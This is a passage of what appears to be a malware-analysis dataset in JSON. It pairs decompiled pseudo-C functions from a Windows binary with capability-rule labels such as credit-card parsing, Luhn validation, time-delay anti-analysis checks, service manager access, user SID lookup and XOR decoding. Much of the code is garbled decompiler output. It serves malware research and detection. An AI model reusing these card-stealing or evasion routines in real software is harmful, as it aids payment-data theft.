= &stack0xfffffffc;\n    uVar10 = unaff_EBX >> 8 ^ 0x16 | in_EAX >> 8;\n    uVar2 = in_EDX >> 8;\n    bVar16 = uVar10 == uVar2;\n    *arg_8h = 0xaa;\n    piVar4 = in_EAX;\n    puVar14 = unaff_ESI;\n    if ((!bVar16) && (bVar16)) {\n        piVar4 = in_EAX & 0xffffff00 | *0x4bb148d3;\n        puVar14 = unaff_ESI + 1;\n        out(*unaff_ESI, in_EDX);\n    }\n    iVar7 = CONCAT31(in_EDX >> 8, 0xb3);\n    arg_8h[1] = 0xb3;\n    puVar15 = puVar14;\n    if ((!bVar16) && (bVar16)) {\n        piVar4 = piVar4 & 0xffffff00 | *0x4bb148d3;\n        puVar15 = puVar14 + 1;\n        out(*puVar14, iVar7);\n    }\n    arg_8h[2] = 0xb2;\n    if ((uVar10 <= uVar2) || (piStack20 = in_EAX,  !bVar16 && uVar2 <= uVar10)) {\n        arg_8h[3] = 0x56;\n        piStack20 = piVar4;\n    }\n    piVar4 = piStack20;\n    ppiVar12 = &piStack20;\n    piVar8 = iVar7 + *(puVar15 + 0x50);\n    arg_8h[4] = piVar8;\n    arg_8h[5] = 0x2e;\n    cVar9 = unaff_EBX;\n    bVar16 = (CONCAT11(((piStack20 >> 8) - cVar9) + 'M', piStack20) & 0x26ae) != 1;\n    arg_8h[6] = 0xb7;\n    ppiVar13 = &stack0xfffffffc;\n    if ((bVar16) && (ppiVar13 = &stack0xfffffffc,  !bVar16)) {\n        cVar1 = '\\x10';\n        do {\n            puVar11 = puVar11 + -1;\n            ppiVar12 = ppiVar12 + -1;\n            *ppiVar12 = *puVar11;\n            cVar1 = cVar1 + -1;\n            ppiVar13 = &piStack20;\n            ppiStack88 = &piStack20;\n            piStack20 = &stack0xfffffffc;\n        } while ('\\0' < cVar1);\n    }\n    arg_8h[7] = 0x22;\n    cStack24187 = arg_8h;\n    cStack24186 = arg_8h >> 8;\n    piVar5 = arg_8h & 0xffff0000 | CONCAT11(cStack24186 - cVar9, cStack24187);\n    bVar16 = (POPCOUNT(piVar5 - piVar8 & 0xff) & 1U) == 0;\n    puVar14 = ppiVar13[2];\n    puVar14[8] = 0;\n    if ((piVar5 < piVar8) || (piVar8 <= piVar5)) {\n        puVar14[9] = 0x78;\n        if (bVar16) goto code_r0x004032f3;\n    }\n    else {\n        *(piVar4 + -0x1f3a4905) = in_ST0 - in_stack_41c692c5;\n        uVar2 = piVar4 - 1U;\n        in_AF = 9 < (uVar2 & 0xf) | in_AF;\n        uVar2 = uVar2 + in_AF * '\\x06';\n        piVar4 = piVar4 - 1U & 0xffffff00 |\n                 uVar2 + (0x90 < (uVar2 & 0xf0) | piVar5 < piVar8 | in_AF * (0xf9 < uVar2)) * '`';\n        *piVar8 = *piVar8 + 0x47c6df84;\n        *(piVar4 + 0x7a) = *(piVar4 + 0x7a) | puVar14;\n        uVar2 = cStack24187 - *(unaff_EBX + 0x66f68bdb);\n        arg_8h = arg_8h & 0xffffff00 | uVar2;\n        bVar16 = (POPCOUNT(uVar2) & 1U) == 0;\n    }\n    if (bVar16) {\n        puVar11 = &uStack24183;\n        cVar9 = '\\x1e';\n        do {\n            ppiVar13 = ppiVar13 + -1;\n            puVar11 = puVar11 + -1;\n            *puVar11 = *ppiVar13;\n            cVar9 = cVar9 + -1;\n        } while ('\\0' < cVar9);\n        uVar3 = in(0x78);\n        return CONCAT44(piVar8, uVar3);\n    }\ncode_r0x004032f3:\n    while( true ) {\n        puVar14[10] = 0x84;\n        puVar14[0xb] = 0xf6;\n        puVar14[0xc] = 0xe;\n        puVar14[0xd] = 0xe8;\n        bVar16 = piVar8 <= (arg_8h & 0xffff0000 | arg_8h & 0xff | (arg_8h >> 8) - cVar9 << 8);\n        arg_8h = ppiVar13[2];\n        arg_8h[0xe] = 0xa4;\n        if ((bVar16) && (!bVar16)) {\n            uVar2 = piVar4;\n            cVar9 = uVar2 - *puVar14;\n            uStack24183 = (in_NT & 1) * 0x4000 | SBORROW1(uVar2, *puVar14) * 0x800 | (in_IF & 1) * 0x200 |\n                          (in_TF & 1) * 0x100 | (cVar9 < '\\0') * 0x80 | (cVar9 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                          ((POPCOUNT(cVar9) & 1U) == 0) * 4 | uVar2 < *puVar14;\n            uStack24181 = (in_ID & 1) * 0x20 | (in_VIP & 1) * 0x10 | (in_VIF & 1) * 8 | (in_AC & 1) * 4;\n            func_0x10189316();\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        arg_8h[0xf] = 0x83;\n        uVar6 = piVar8 - 1U & arg_8h;\n        bVar17 = uVar6 == 0;\n        bVar16 = (POPCOUNT(uVar6 & 0xff) & 1U) == 0;\n        arg_8h[0x10] = 0xe3;\n        arg_8h[0x11] = 0x3d;\n        if ((bVar16) || (!bVar16)) goto code_r0x00403403;\n        ppiVar12 = segment(in_SS, *0x10 + -0x5e73);\n        piVar4 = *ppiVar12;\n        piVar8 = 0xb7bc9ea5;\n        if (!bVar16) break;\n        uStack24179 = uStack24179 & 0xffff0000 | in_CS;\n        *puVar14 = *puVar15;\n        puVar15 = puVar15 + 1;\n        puVar14 = puVar14 + 1;\n    }\n    bVar17 = *0x10 == 0x5e6f;\n    bVar16 = (POPCOUNT(auStack24175 & 0xff) & 1U) == 0;\n    piVar4 = piVar4;\ncode_r0x00403403:\n    arg_8h[0x12] = 0x6d;\n    arg_8h[0x13] = 0x15;\n    if ((bVar16) || (!bVar16)) {\n        arg_8h[0x14] = 0xa1;\n        piVar5 = piVar4;\n    }\n    else {\n        ppiVar13 = *0xc617b43a;\n        uVar2 = piVar8 + 1U + 0xa1;\n        bVar17 = uVar2 == 0;\n        piVar5 = piVar8 + 1U & 0xffffff00 | uVar2;\n        piVar8 = piVar4;\n    }\n    if ((bVar17) || (!bVar17)) {\n        piVar5 = ppiVar13[3];\n    }\n    *(piVar5 | 0x5f) = 0x15;\n    return CONCAT44(piVar8, piVar5) | 0x5f;\n}\n",
        "token_count": 2526
    },
    "00403a20": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403bb3) overlaps instruction at (ram,0x00403bb2)\n// \n// WARNING: Removing unreachable block (ram,0x00403a46)\n// WARNING: Removing unreachable block (ram,0x00403bb3)\n\nuint __fastcall fcn.00403a20(int32_t param_1, uint32_t param_2, uchar *param_3, uint param_4)\n\n{\n    int32_t iVar1;\n    char **ppcVar2;\n    char *pcVar3;\n    char cVar5;\n    uint in_EAX;\n    char *pcVar4;\n    uint *puVar6;\n    uint *unaff_ESI;\n    uint *puVar7;\n    char *unaff_EDI;\n    char **ppcVar8;\n    bool bVar9;\n    uchar in_ZF;\n    char in_SF;\n    char in_OF;\n    bool bVar10;\n    char *pcStackY48;\n    uint *puStackY44;\n    ushort *puStackY36;\n    ushort uStackY28;\n    ushort uStackY26;\n    int16_t iStackY24;\n    ushort uStackY22;\n    char *in_stack_ffffffec;\n    uchar *puVar11;\n    \n    puVar7 = unaff_ESI;\n    pcVar4 = unaff_EDI;\n    if ((in_OF == in_SF) && (in_stack_ffffffec = unaff_EDI,  in_OF != in_SF)) {\n        puVar7 = unaff_ESI + -1;\n        pcVar4 = (unaff_EDI | &stack0xfffffffc) + 1;\n        *(unaff_EDI | &stack0xfffffffc) = in_EAX;\n        in_OF = '\\0';\n        param_2 = param_2 & 0xffffff00;\n        in_SF = '\\0';\n        in_ZF = in_EAX + (in_EAX >> 8) * 'y' == '\\0';\n    }\n    *param_3 = 0xad;\n    if ((!in_ZF && in_OF == in_SF) && (in_ZF || in_OF != in_SF)) {\n        if (param_1 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        iStackY24 = 0x39e2;\n        uStackY22 = 0x40;\n        fcn.00401cc0(0, puVar7);\n        if (*0x41e3d0 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        }\n        return 1;\n    }\n    param_3[1] = 0xea;\n    if ((in_ZF) || (puVar11 = in_stack_ffffffec & 0xffff,  !in_ZF)) {\n        param_3[2] = 0xb2;\n        uStackY28 = param_2;\n        uStackY26 = param_2 >> 0x10;\n        pcStackY48 = pcVar4;\n        puStackY44 = puVar7;\n        puStackY36 = &stack0xfffffff0;\n        puVar11 = param_3;\n    }\n    iVar1 = puStackY44[2];\n    *(iVar1 + 3) = 0xb;\n    *(iVar1 + 4) = 0x5d;\n    pcVar4 = puStackY44[2];\n    pcVar4[5] = '\\x05';\n    do {\n        ppcVar2 = puStackY44[2];\n        *(ppcVar2 + 6) = 0x26;\n        *(ppcVar2 + 7) = 0xa2;\n        puVar7 = puStackY44;\n        if ((puStackY36 != 0xffffffff) && (puStackY36 == 0xffffffff)) {\n            puVar6 = &iStackY24;\n            puVar7 = &iStackY24;\n            cVar5 = '\\x10';\n            do {\n                puStackY44 = puStackY44 + -1;\n                puVar6 = puVar6 + -1;\n                *puVar6 = *puStackY44;\n                cVar5 = cVar5 + -1;\n            } while ('\\0' < cVar5);\n        }\n        *(ppcVar2 + 2) = 4;\n        *(ppcVar2 + 9) = 0xc;\n        iStackY24 = pcVar4;\n        uStackY22 = pcVar4 >> 0x10;\n        bVar9 = (POPCOUNT((iStackY24 + puStackY36 | 0x11a9U) & 0xff) & 1U) == 0;\n        *(ppcVar2 + 10) = 0x58;\n        puStackY44 = puVar7;\n        if ((bVar9) || (!bVar9)) goto code_r0x00403b38;\n        pcVar3 = *ppcVar2;\n        *ppcVar2 = pcStackY48;\n        puStackY44 = puVar7 - *(puVar7 + 0x5f9dff63);\n        pcStackY48 = pcVar3;\n    } while (puStackY44 < 0);\n    if (pcVar3 < 0) {\ncode_r0x00403b38:\n        *(ppcVar2 + 0xb) = 0x7b;\n        *(ppcVar2 + 3) = 0x6c;\n        bVar9 = (CONCAT11((((pcVar4 & 0xffff) >> 8) - puStackY36) + 'M', pcVar4 & 0xffff) & 0x26ae) != 1;\n        *(ppcVar2 + 0xd) = 0x38;\n        if ((bVar9) && (!bVar9)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *(ppcVar2 + 0xe) = 0xea;\n        bVar10 = false;\n        bVar9 = false;\n        pcVar4 = puStackY44[2];\n        pcVar4[0xf] = -0x3f;\n    }\n    else {\n        *ppcVar2 = *ppcVar2 + CONCAT22(uStackY26, uStackY28);\n        *puStackY36 = puVar11;\n        *pcVar4 = *pcVar4 + pcVar4;\n        pcVar3 = pcVar3 + 0x52;\n        cVar5 = pcVar4 >> 8;\n        bVar10 = SCARRY1(*pcVar3, cVar5);\n        *pcVar3 = *pcVar3 + cVar5;\n        bVar9 = *pcVar3 < '\\0';\n    }\n    ppcVar8 = ppcVar2;\n    if (bVar10 != bVar9) {\n        out(0xc4, pcVar4);\n        ppcVar8 = ppcVar2 + 1;\n        *ppcVar2 = pcVar4;\n        cVar5 = puStackY36 >> 8;\n        bVar10 = SBORROW1(cVar5, *pcVar4);\n        bVar9 = cVar5 - *pcVar4 < '\\0';\n    }\n    pcVar4[0x10] = -0x16;\n    if ((bVar10 == bVar9) && (bVar10 != bVar9)) {\n        *(ppcVar8 | puStackY44) = pcVar4;\n        pcVar4 = pcVar4 & 0xffff0000 | pcVar4 + (pcVar4 >> 8) * 'y';\n    }\n    pcVar4[0x11] = '\\x16';\n    *unaff_ESI[3] = 0x12;\n    return param_4;\n}\n",
        "token_count": 1735
    },
    "00402ee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00402ee0(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00404b80;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x406010;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 218
    },
    "00401330": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040136e) overlaps instruction at (ram,0x0040136d)\n// \n// WARNING: Removing unreachable block (ram,0x0040136e)\n\nbool fcn.00401330(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    bool bVar3;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10ch = 0;\n    var_4h = 0x104;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.00401210(0x80000001, 0x410100, 0x41012c, &var_8h, &var_10ch, &var_4h);\n    bVar3 = iVar1 != 0;\n    if (bVar3) {\n        if ((bVar3) && (!bVar3)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        iVar1 = func_0x004012b0(*0x10 + -0x110);\n        return iVar1 != -1;\n    }\n    return false;\n}\n",
        "token_count": 358
    },
    "004013e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401488) overlaps instruction at (ram,0x00401486)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00401603)\n// WARNING: Removing unreachable block (ram,0x004014ca)\n// WARNING: Removing unreachable block (ram,0x004014d7)\n// WARNING: Removing unreachable block (ram,0x00401488)\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004013e0(void)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint16_t uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    ushort extraout_CX;\n    int32_t unaff_EBX;\n    uchar *puVar7;\n    uchar *puVar8;\n    code *unaff_ESI;\n    uint *puVar9;\n    ushort in_SS;\n    bool bVar10;\n    ulong uVar11;\n    unkbyte6 Var12;\n    uint uStack59;\n    uint uStack55;\n    int32_t iStack51;\n    uint uStack47;\n    ushort uStack43;\n    ushort uStack41;\n    uchar uStack39;\n    uchar uStack38;\n    uchar uStack37;\n    uint uStack36;\n    uchar uStack32;\n    uchar uStack31;\n    ushort uStack30;\n    uchar uStack28;\n    uchar uStack27;\n    uchar uStack26;\n    uchar uStack25;\n    uint uStack24;\n    uint hModule;\n    \n    puVar2 = _sym.imp.KERNEL32.dll_LoadLibraryA;\n    puVar7 = &stack0xfffffffc;\n    puVar8 = &stack0xfffffffc;\n    if (*0x41e3bc != 0) {\n        return 1;\n    }\n    uStack24._0_1_ = 0xe0;\n    uStack24._1_3_ = 0x40ff;\n    uStack28 = 0x26;\n    uStack27 = 0x14;\n    uStack26 = 0x40;\n    uStack25 = 0;\n    Var12 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    iVar5 = Var12;\n    bVar10 = iVar5 == 0;\n    if (bVar10) {\n        return 0;\n    }\n    if (bVar10) {\ncode_r0x0040144f:\n        uStack28 = 0xec;\n        uStack27 = 0xff;\n        uStack26 = 0x40;\n        uStack25 = 0;\n        unaff_ESI = _sym.imp.KERNEL32.dll_GetProcAddress;\n        puVar9 = puVar2;\n    }\n    else {\n        uStack28 = SUB41(puVar2, 0);\n        uStack27 = puVar2 >> 8;\n        uStack26 = puVar2 >> 0x10;\n        uStack25 = puVar2 >> 0x18;\n        if (!bVar10) goto code_r0x0040144f;\n        puVar9 = puVar2 + 1;\n        uVar1 = in(Var12 >> 0x20);\n        *puVar2 = uVar1;\n        if (&stack0xffffffe8 < 1) {\n            unaff_ESI[0x57] = unaff_ESI[0x57];\n            goto code_r0x004014be;\n        }\n        iVar5 = -0x211ffff0;\n        *(unaff_EBX + 0x40507435) = *(unaff_EBX + 0x40507435) ^ extraout_CX;\n        *0xdedffffc = *0xdedffffc + (extraout_CX >> 8);\n        *0xdee00010 = *0xdee00010 + 1;\n    }\n    uStack32 = iVar5;\n    uStack31 = iVar5 >> 8;\n    uStack30 = iVar5 >> 0x10;\n    uStack36 = 0x40145d;\n    uVar11 = (*unaff_ESI)();\n    *0x41e3ac = uVar11;\n    bVar10 = (POPCOUNT(*0x41e3ac & 0xff) & 1U) == 0;\n    if (*0x41e3ac == 0) {\n        return 0;\n    }\n    if ((bVar10) || (!bVar10)) {\n        uStack27 = 0xf8;\n        uStack26 = 0xff;\n        uStack25 = 0x40;\n        uStack24._0_1_ = 0;\n    }\n    else {\n        unaff_ESI = 0x34a96cf4;\n        piVar6 = (uVar11 >> 0x20) + 1;\n        puVar7 = *0x6817b43a;\n        *piVar6 = *piVar6 + 1;\n    }\n    uStack31 = 0x8b;\n    uStack30 = 0x4014;\n    uStack28 = 0;\n    uStack36 = (*puVar9)();\n    if (uStack36 == 0) {\n        return 0;\n    }\n    uStack31 = 4;\n    uStack30 = 0x4100;\n    uStack28 = 0;\n    uStack32 = uStack36 >> 0x18;\n    uStack39 = 0xa6;\n    uStack38 = 0x14;\n    uStack37 = 0x40;\n    uStack36 = uStack36 << 8;\n    *0x41e3b4 = (*unaff_ESI)();\n    if (*0x41e3b4 == 0) {\n        return 0;\n    }\n    uStack25 = SUB41(puVar9, 0);\n    uStack24._0_1_ = puVar9 >> 8;\n    puVar8 = puVar7;\ncode_r0x004014be:\n    uVar3 = CONCAT11(uStack24, uStack25);\n    uStack27 = 0x10;\n    uStack26 = 0;\n    uStack25 = 0x41;\n    uStack24 = uStack24._1_3_ << 8;\n    uStack31 = 0xe2;\n    uStack30 = 0x4014;\n    uStack28 = 0;\n    iStack51 = (*(puVar9 & 0xffff0000 | uVar3))();\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    *(puVar8 + -4) = iStack51;\n    if (iStack51 == 0) {\n        return 0;\n    }\n    uStack31 = 0x1c;\n    uStack30 = 0x4100;\n    uStack28 = 0;\n    uStack36._1_3_ = iStack51;\n    uStack32 = iStack51 >> 0x18;\n    uStack39 = 0x1e;\n    uStack38 = 0x15;\n    uStack37 = 0x40;\n    uStack36._0_1_ = 0;\n    *0x41e3b0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    if (*0x41e3b0 == 0) {\n        return 0;\n    }\n    uStack39 = 0x2c;\n    uStack38 = 0;\n    uStack37 = 0x41;\n    uStack36 = uStack36._1_3_ << 8;\n    uStack43 = iStack51;\n    uStack41 = iStack51 >> 0x10;\n    uStack47 = 0x40154b;\n    *0x41e3a4 = (*pcVar4)();\n    if (*0x41e3a4 == 0) {\n        return 0;\n    }\n    uStack47 = 0x410040;\n    uStack55 = 0x401583;\n    *0x41e3a8 = (*pcVar4)();\n    if (*0x41e3a8 == 0) {\n        return 0;\n    }\n    uStack59 = *(puVar8 + -4);\n    uStack55 = 0x410054;\n    *0x41e3b8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    bVar10 = (POPCOUNT(*0x41e3b8 & 0xff) & 1U) == 0;\n    if (*0x41e3b8 == 0) {\n        return 0;\n    }\n    if ((!bVar10) && (bVar10)) {\n        puVar2 = segment(in_SS, *0x10 + -0x3b);\n        if (bVar10) {\n            unaff_ESI[-0x7f] = unaff_ESI[-0x7f] + (*puVar2 >> 8);\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *(((&stack0xffffffc5 & 0xffff0000 | *0x10 - 0x37) ^ unaff_ESI) - 4) = 0xb7bc9ea5;\n    }\n    *0x41e3bc = 1;\n    return 1;\n}\n",
        "token_count": 2073
    },
    "00401600": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t fcn.00401600(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 48
    },
    "00401e30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain pusha popa sequence"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401e30(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint uVar1;\n    uint var_4h;\n    \n    arg_8h_00 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    fcn.00402d60(arg_8h_00, arg_8h);\n    uVar1 = fcn.00404830(arg_8h_00, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(arg_8h_00);\n    return uVar1;\n}\n",
        "token_count": 156
    },
    "00402190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004021ce) overlaps instruction at (ram,0x004021cc)\n// \n\nuint __cdecl fcn.00402190(int32_t arg_8h, uint *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t arg_8h_00;\n    uint32_t uVar2;\n    int32_t extraout_ECX;\n    char *pcVar4;\n    uint *arg_ch_00;\n    bool bVar5;\n    uint8_t in_AF;\n    ulong uVar6;\n    char cVar3;\n    \n    arg_ch_00 = arg_ch;\n    arg_8h_00 = arg_8h;\n    uVar6 = int.00401790(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    pcVar4 = uVar6 >> 0x20;\n    uVar2 = uVar6;\n    bVar5 = (POPCOUNT(uVar2 & 0xff) & 1U) != 0;\n    if (uVar2 == 0) {\n        return 0;\n    }\n    if (bVar5) {\n        if (!bVar5) {\n            out(*arg_ch_00, uVar6 >> 0x20);\n            do {\n                cVar3 = uVar2 >> 8;\n                in_AF = 9 < (uVar2 & 0xf) | in_AF;\n                uVar2 = CONCAT31(CONCAT21(uVar2 >> 0x10, cVar3 - in_AF), -in_AF);\n            } while (in_AF || cVar3 == *pcVar4);\n            piVar1 = arg_8h_00 + pcVar4 * 2;\n            *piVar1 = (*piVar1 + 0x7b) - in_AF;\n            *(extraout_ECX + -0x75) = uVar2;\n            arg_ch_00 = arg_ch_00 + 1;\n            goto code_r0x004021d4;\n        }\n    }\n    *(uVar2 + 0x58) = arg_ch;\ncode_r0x004021d4:\n    int.00401790(arg_8h_00, arg_ch_00, &arg_8h, &arg_ch);\n    return 1;\n}\n",
        "token_count": 505
    },
    "00402e00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get session user name"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402ed5) overlaps instruction at (ram,0x00402ecc)\n// \n// WARNING: Removing unreachable block (ram,0x00402ec6)\n\nuint fcn.00402e00(uint param_1)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uchar auStack800 [260];\n    uchar auStack540 [260];\n    uchar auStack280 [260];\n    uchar auStack20 [4];\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack16 = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(auStack540, &uStack16);\n    bVar2 = iVar1 == 0;\n    if (bVar2) {\n        return 0;\n    }\n    uStack8 = 0x104;\n    uStack12 = 0x104;\n    if ((!bVar2) && (bVar2)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)\n                      (0, auStack540, auStack280, &uStack8, auStack800, &uStack12, auStack20);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(auStack280, param_1);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 360
    },
    "00403150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00403150(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.004031d0(&var_68h, &var_4h);\n    fcn.00403540(&var_68h, var_4h, 0x406014, 0x9e60);\n    *arg_8h = 0x406014;\n    *arg_ch = 0x9e60;\n    return;\n}\n",
        "token_count": 255
    },
    "00403470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00403470(char *arg_8h, uint32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    char *pcVar2;\n    int32_t unaff_EBX;\n    int32_t iVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint8_t in_AF;\n    bool bVar6;\n    \n    pcVar2 = (arg_8h - arg_14h) + arg_ch;\n    iVar3 = arg_14h;\n    if ((pcVar2 != NULL) && (pcVar2 == NULL)) {\n        if (CARRY4(arg_8h - arg_14h, arg_ch) || unaff_EBX + 1 == 0) {\n            return NULL;\n        }\n        uVar1 = 9 < (arg_8h & 0xf) | in_AF;\n        arg_8h = arg_8h & 0xffff0000 | CONCAT11((arg_8h >> 8) + uVar1, arg_8h + uVar1 * '\\x06') & 0xff0f;\n        *(arg_8h + 0x2a) = *(arg_8h + 0x2a) - (unaff_EBX + 1);\n        iVar3 = arg_14h + 1;\n    }\n    if (iVar3 == 0) {\n        return arg_8h;\n    }\n    do {\n        if (pcVar2 < arg_8h) {\n            return NULL;\n        }\n        if (*arg_8h == *arg_10h) {\n            bVar6 = true;\n            pcVar5 = arg_10h + 1;\n            pcVar4 = arg_8h;\n            do {\n                pcVar4 = pcVar4 + 1;\n                iVar3 = iVar3 + -1;\n                if (iVar3 == 0) break;\n                bVar6 = *pcVar4 == *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (bVar6);\n            iVar3 = arg_14h;\n            if (bVar6) {\n                return arg_8h;\n            }\n        }\n        arg_8h = arg_8h + 1;\n    } while( true );\n}\n",
        "token_count": 515
    },
    "004034f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004034f0(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar1 = fcn.004016f0(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 122
    },
    "00403540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004035a8) overlaps instruction at (ram,0x004035a7)\n// \n// WARNING: Removing unreachable block (ram,0x004035a8)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00403540(int32_t param_1, uint32_t param_2, int32_t *param_3, uint32_t param_4)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    \n    uVar1 = 0;\n    if (param_4 != 0) {\n        do {\n            uVar2 = *(uVar1 + param_3) ^ *(uVar1 % param_2 + param_1);\n            piVar3 = param_3;\n            if ((-1 < uVar2) && (-1 >= uVar2)) {\n                out(0xc4, param_1);\n                piVar3 = param_3 + 1;\n                *param_3 = param_1;\n            }\n            *(uVar1 + piVar3) = uVar2;\n            uVar1 = uVar1 + 1;\n            param_3 = piVar3;\n        } while (uVar1 < param_4);\n    }\n    return;\n}\n",
        "token_count": 292
    },
    "00403d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
